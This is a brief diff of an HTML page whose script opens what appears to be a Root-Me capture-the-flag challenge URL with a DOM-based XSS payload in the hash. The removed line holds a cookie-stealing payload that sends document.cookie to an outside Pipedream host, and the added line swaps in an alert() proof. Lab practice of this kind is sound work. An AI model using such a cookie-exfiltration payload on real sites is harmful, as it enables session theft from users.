@@ -6,7 +6,7 @@
 <body>
   <script>
     const targetURL = "http://challenge01.root-me.org:58003/profile";
-    const xssPayload = "<img src='x' onerror='fetch(\`https://eo2uyqmp09oup0u.m.pipedream.net?cookie=\${document.cookie}\`)'>";
+    const xssPayload = "<img src='x' onerror='alert("XSS works!")'>";
     const maliciousHash = "#<div id='output'>" + xssPayload + "</div>";
     const newWindow = window.open(targetURL + maliciousHash);
   </script>
